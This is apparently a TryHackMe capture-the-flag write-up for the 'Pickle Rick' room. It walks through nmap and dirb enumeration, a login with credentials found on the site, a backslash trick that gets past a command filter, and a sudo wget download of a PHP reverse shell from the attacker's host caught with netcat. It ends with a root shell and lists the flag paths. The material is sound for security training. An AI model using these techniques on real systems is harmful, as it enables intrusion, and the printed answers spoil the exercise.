<p align="center">
  THM : Pickle Rick<br>
  Difficulty : Easy<br>
  Room link : https://tryhackme.com/room/picklerick<br>
  <img src="https://i.imgur.com/3ypKR1f.png">
</p>

## Summary
- [NMAP Scan](#nmap-scan)
- [Manual Website Enumeration](#manual-website-enumeration)
- [Dirb Scan](#dirb-scan)
- [Getting a shell](#getting-a-shell)
- [Find flags](#find-flags)
- [Conclusion](#conclusion)

## NMAP Scan
```
# Nmap 7.92 scan initiated Fri Aug 19 23:14:31 2022 as: nmap -A -p- -oN nmapResults.txt 10.10.99.97
Nmap scan report for 10.10.99.97
Host is up (0.028s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 66:c4:52:9e:e4:3a:d7:d1:cb:3f:d7:0e:e6:09:82:6e (RSA)
|_  256 3c:31:4a:49:af:7d:8e:75:70:40:db:04:69:d5:18:e6 (ECDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Rick is sup4r cool
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 19 23:14:48 2022 -- 1 IP address (1 host up) scanned in 17.18 seconds
```
## Manual website enumeration
If we go to the index page of the website, we can see that Rick is talking about a password that he forgot.
![alt text](https://i.imgur.com/1xrSiU4.png)  

Looking at the source code of the page, we can see that Rick left a comment containing a username.  
![alt text](https://i.imgur.com/1YaCAlY.png)  
So now we have a username : **R1ckRul3s**

One of the first things I look for when i'm enumerating a website is the robot.txt file. So let's see if there is a robot.txt file on this web server.  
![alt text](https://i.imgur.com/cqP0pux.png)  
And we found a strange looking strings... It's not a page of the webserver so.. Maybe the password that Rick lost ? Let's write it down for the moment.  
## Dirb Scan
First I tried a simple dirb scan but it didn't found any interesting pages, so I decided to try using the -X parameter to search for page with extensions like so : ```dirb http://10.10.99.97/ -X .php```  
```
┌──(attacker㉿AttackBox)-[~/Bureau/CTF/Pickle_Rick]
└─$ dirb http://10.10.99.97/ -X .php     

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Aug 19 23:20:38 2022
URL_BASE: http://10.10.99.97/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.99.97/ ----
+ http://10.10.99.97/denied.php (CODE:302|SIZE:0)
+ http://10.10.99.97/login.php (CODE:200|SIZE:882)
```
And we found a login.php page ! (The denied.php page redirects us to login.php)  
So let's go to this page and try to login with the informations we gathered :
![alt text](https://i.imgur.com/reIQn7I.png)  

Using **R1ckRul3s** as login and **Wubbalubbadubdub** as password, we are redirected to a portal.php page.  
![alt text](https://i.imgur.com/B3hfAUr.png)  

We cannot access any pages using the menu on top of the page. But here we have an input field that seems to be used to run commands. So let's try using **whoami**.  
![alt text](https://i.imgur.com/2u9jgra.png)  
We see that we can run linux commands. So we can try to use some other commands... I tried some useful commands and , we can run ls, wget, sudo -l, and cat, but there is some filters that prevent from using some commands , like for cat.  
We can easily bypass those filters by just putting a '\\' inside the command, like so : **c\at file**.  
Now we have multiple choices... I could just find the different flags using this command input, but I want to get a reverse shell, it will be more easier to search on the machine.  
Like I said, we can use sudo -l and ...  
![alt text](https://i.imgur.com/FKO4Icb.png)  
Yes... www-data can run any commands as root, without password.

## Getting a shell
I tried to download a reverse shell to the machine using wget, but it didn't work, because www-data don't have write premissions to /var/www/html. So I just ran the same command as sudo like so : ```sudo wget [my ip]/php-reverse-shell.php```.
Then I just set up a netcat listener on my machine, I entered http://[machine ip]/php-reverse-shell.php in the URL of my web browser, and I got a reverse shell.
Now I can just run ```python3 -c 'import pty; pty.spawn("/bin/bash")'``` and then ```sudo su``` to get a shell as root.  

## Find flags
Now I can get the 3 flags (ingredients for the potion that Rick needs) :  
What is the first ingredient Rick needs ? : **cat /var/www/html/Sup3rS3cretPickl3Ingred.txt**  
Whats the second ingredient Rick needs ? : **cat /home/rick/second\ ingredients**  
Whats the final ingredient Rick needs ? : **cat /root/3rd.txt**  

## Conclusion
In this CTF, we see that it can be useful to read the source code of pages on a web server, we can find useful informations, even if there is no credentials we can find CMS versions, links to other pages...  
I also learned that it is very easy for an attacker to get a full control of the machine if the user www-data has too much permissions. It is very important to manage permissions properly, www-data should not have the right to run any command as root.
Also, even if there is filters on command input, there is sometimes a way to bypass it.

